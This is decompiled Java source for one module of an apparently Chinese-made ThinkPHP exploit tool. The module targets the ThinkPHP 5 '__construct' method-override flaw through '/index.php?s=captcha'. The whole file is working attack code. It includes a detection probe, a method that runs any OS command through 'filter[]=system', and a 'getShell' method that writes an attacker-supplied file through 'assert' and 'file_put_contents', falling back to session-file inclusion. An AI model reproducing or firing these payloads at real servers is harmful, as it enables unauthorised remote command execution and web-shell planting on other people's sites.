/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.io.UnsupportedEncodingException;
/*    */ import java.net.URLEncoder;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.util.Base64;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_construct_code_exec_3
/*    */   implements BaseExp {
/* 15 */   private String results = null;
/* 16 */   private final HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 20 */     url = url + "/index.php?s=captcha";
/* 21 */     String payload = "s=dylan&_method=__construct&method=POST&filter[]=var_dump";
/* 22 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 23 */     Response response = HttpTool.post(url, payload, this.property);
/* 24 */     if (response.getText().contains("string(5) \"dylan\"")) {
/* 25 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 26 */       return this.results;
/*    */     } 
/* 28 */     if (response.getError() != null) {
/* 29 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 30 */       return this.results;
/*    */     } 
/* 32 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 33 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 38 */     url = url + "/index.php?s=captcha";
/* 39 */     String payload = "s=" + cmd + "&_method=__construct&method=POST&filter[]=system";
/* 40 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 41 */     Response response = HttpTool.post(url, payload, this.property);
/* 42 */     if (response.getError() == null) {
/* 43 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 45 */       this.results = response.getError();
/*    */     } 
/* 47 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/*    */     try {
/* 53 */       String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
/* 54 */       content = URLEncoder.encode(base64Content, "UTF-8");
/* 55 */       String payload = "s=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=__construct&method=POST&filter[]=assert";
/* 56 */       this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 57 */       Response response = HttpTool.post(url + "/index.php?s=captcha", payload, this.property);
/* 58 */       if (response.getError() == null) {
/* 59 */         this.property.clear();
/* 60 */         response = HttpTool.get(url + "/" + fileName, this.property);
/* 61 */         if (response.getCode() == 200) {
/* 62 */           this.results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/* 63 */           return this.results;
/*    */         } 
/*    */       } 
/* 66 */       tp5_session_fi_getshell tp5sfg = new tp5_session_fi_getshell();
/* 67 */       this.results = tp5sfg.getshell(url, "/index.php?s=captcha", fileName, base64Content);
/* 68 */     } catch (UnsupportedEncodingException e) {
/* 69 */       this.results = "[-] 上传失败: " + e.getMessage();
/*    */     } 
/* 71 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_construct_code_exec_3.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */